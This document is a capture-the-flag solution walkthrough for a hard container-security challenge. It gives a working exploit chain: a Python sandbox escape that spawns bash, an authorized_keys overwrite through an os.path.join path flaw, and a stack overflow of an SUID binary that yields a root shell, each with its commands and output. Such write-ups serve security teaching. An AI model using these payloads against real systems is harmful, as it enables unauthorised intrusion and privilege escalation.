# Solution Walkthrough: Containment Breach (Sentinel Base Model)

## Challenge Summary
- **Challenge Name:** Containment Breach
- **Category:** Shell / Container Security / Binary Exploitation
- **Difficulty:** Hard
- **Entry Protocol:** SSH (Port 22)
- **Initial Foothold:** `ctf:sentinel123` (or platform dynamic credentials)
- **Flag Format:** Dynamic (`YUVA{...}` / `process.env.FLAG`) located at `/root/flag.txt` (`chmod 400 root:root`)

---

## Architecture & Exploit Chain Overview
The challenge emulates an enterprise-grade hardened container environment ("Sentinel Guarded Container").
Exploitation requires traversing three distinct defense layers:

1. **Stage 1 (Foothold & Jailbreak):**
   - SSH login places the user inside `/opt/sentinel/bin/sentinel-shell`, a restricted diagnostic CLI.
   - The shell parses telemetry alert expressions using AST analysis, disallowing direct identifier names (`os`, `sys`, `subprocess`, `open`, `eval`).
   - *Exploit:* Exploit Python's class hierarchy via `().__class__.__base__.__subclasses__()` to locate `subprocess.Popen` and spawn an interactive `/bin/bash` shell.

2. **Stage 2 (Lateral Service Movement):**
   - From standard bash as user `ctf` (uid 1001), user finds an internal UNIX domain socket at `/run/sentinel/sentry.sock` owned by service user `sentry` (uid 1002).
   - The socket accepts JSON commands authenticated by a local token at `/var/run/sentinel/sentry.token` (readable by `sentinel-users`).
   - The `save_snapshot` action uses Python's `os.path.join(SNAPSHOT_DIR, filename)`. When `filename` starts with `/`, `os.path.join` ignores the base directory and writes directly to the absolute path specified.
   - *Exploit:* Send a snapshot request specifying `filename: "/home/sentry/.ssh/authorized_keys"` containing an attacker-generated SSH public key. Pivot to user `sentry` via SSH (`ssh sentry@localhost`).

3. **Stage 3 (Privilege Escalation to Root):**
   - As user `sentry`, discover an SUID root binary at `/opt/sentinel/bin/container-ctl` (`-rwsr-xr-x root:root`).
   - Source code is provided for inspection in `/opt/sentinel/src/container-ctl.c`.
   - The `--load-diag <file>` command reads up to 256 bytes into a 128-byte stack buffer without stack canaries (`-fno-stack-protector -no-pie`).
   - The binary includes a recovery handler `emergency_console()` that executes `setuid(0); execve("/bin/bash", ...)`.
   - *Exploit:* Craft a 160-byte payload (152 bytes padding + 8 bytes address `0x004012d6`). Overwrite the return address to trigger `emergency_console()`, achieving interactive root shell and reading `/root/flag.txt`.

---

## Detailed Step-by-Step Manual Exploitation

### Step 1: Initial SSH Foothold & Stage 1 Breakout
Connect to the challenge container over SSH:
```bash
ssh ctf@<target-ip> -p 22
# Password: sentinel123
```
You are greeted by the restricted shell:
```text
╔═══════════════════════════════════════════════════════════════╗
║         SENTINEL SECURE CONTAINER ENVIRONMENT (v2.4)          ║
║      Restricted Diagnostics & Telemetry Interface Shell       ║
╚═══════════════════════════════════════════════════════════════╝
sentinel:~$
```

Execute the PyJail subclass traversal payload via `eval-rule`:
```text
eval-rule "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == chr(80)+chr(111)+chr(112)+chr(101)+chr(110)][0](['/bin/bash', '-i']).wait()"
```
This spawns an interactive bash shell as user `ctf`:
```bash
id
# uid=1001(ctf) gid=2000(sentinel-users) groups=2000(sentinel-users)
```

---

### Step 2: Lateral Escalation to User `sentry`
Inspect the environment:
```bash
ls -la /run/sentinel/
cat /var/run/sentinel/sentry.token
```

Generate an SSH keypair in `/tmp`:
```bash
ssh-keygen -t rsa -N "" -f /tmp/id_rsa -q
```

Send the payload to `/run/sentinel/sentry.sock` using Python:
```python
import socket, json

token = open('/var/run/sentinel/sentry.token').read().strip()
pub_key = open('/tmp/id_rsa.pub').read().strip() + '\n'

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/run/sentinel/sentry.sock')

req = {
    "auth_token": token,
    "action": "save_snapshot",
    "filename": "/home/sentry/.ssh/authorized_keys",
    "data": pub_key
}

s.sendall(json.dumps(req).encode())
print(s.recv(4096).decode())
s.close()
```

Connect via SSH as user `sentry`:
```bash
ssh -i /tmp/id_rsa sentry@localhost
```
Verify user:
```bash
id
# uid=1002(sentry) gid=2000(sentinel-users) groups=2000(sentinel-users)
```

---

### Step 3: Container Root Escalation via `container-ctl`
Find SUID binaries:
```bash
find / -perm -4000 -type f 2>/dev/null
# /opt/sentinel/bin/container-ctl
```

Inspect the source code at `/opt/sentinel/src/container-ctl.c`:
Notice `emergency_console()` and `load_diagnostic_packet()`.

Find the address of `emergency_console`:
```bash
nm /opt/sentinel/bin/container-ctl | grep emergency_console
# 00000000004012d6 T emergency_console
```

Generate the stack overflow payload (152 bytes padding + `0x4012d6` in little-endian):
```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*152 + (0x4012d6).to_bytes(8, 'little'))" > /tmp/pwn.bin
```

Execute the binary:
```bash
/opt/sentinel/bin/container-ctl --load-diag /tmp/pwn.bin
```

Output:
```text
[*] Ingesting diagnostic packet from file '/tmp/pwn.bin'...
[+] Ingested 160 bytes into telemetry analysis buffer.
[!] SENTINEL CRITICAL FAULT: Entering Break-Glass Emergency Shell...
root@container:/# id
uid=0(root) gid=0(root) groups=0(root)
root@container:/# cat /root/flag.txt
YUVA{...}
```

---

## Automated Solve Script
Run the automated exploit:
```bash
python3 solve.py --host 127.0.0.1 --port 22 --user ctf --password sentinel123
```
